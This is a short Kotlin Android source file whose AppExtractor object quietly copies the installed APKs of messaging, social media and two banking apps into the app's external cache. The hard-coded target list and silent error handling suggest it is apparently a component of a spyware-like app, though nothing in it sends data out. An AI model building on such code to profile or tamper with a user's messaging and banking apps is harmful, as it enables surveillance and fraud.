package com.sextexer.sex

import android.content.Context
import android.content.pm.PackageManager
import org.json.JSONArray
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream

object AppExtractor {
    fun extractKeyApps(context: Context): List<File> {
        val extractedFiles = mutableListOf<File>()
        val keyPackages = listOf(
            "com.whatsapp",
            "org.telegram.messenger",
            "com.instagram.android",
            "com.snapchat.android",
            "com.twitter.android",
            "com.facebook.katana",
            "com.bankofamerica.app", // Example banking
            "com.chase.sig.android"  // Example banking
        )
        
        val pm = context.packageManager
        
        for (pkg in keyPackages) {
            try {
                val appInfo = pm.getApplicationInfo(pkg, 0)
                val apkPath = appInfo.sourceDir
                val destFile = File(context.externalCacheDir, "${pkg.replace(".", "_")}.apk")
                
                FileInputStream(apkPath).use { input ->
                    FileOutputStream(destFile).use { output ->
                        input.copyTo(output)
                    }
                }
                
                extractedFiles.add(destFile)
            } catch (e: Exception) {
                // App not installed, skip
            }
        }
        
        return extractedFiles
    }
}
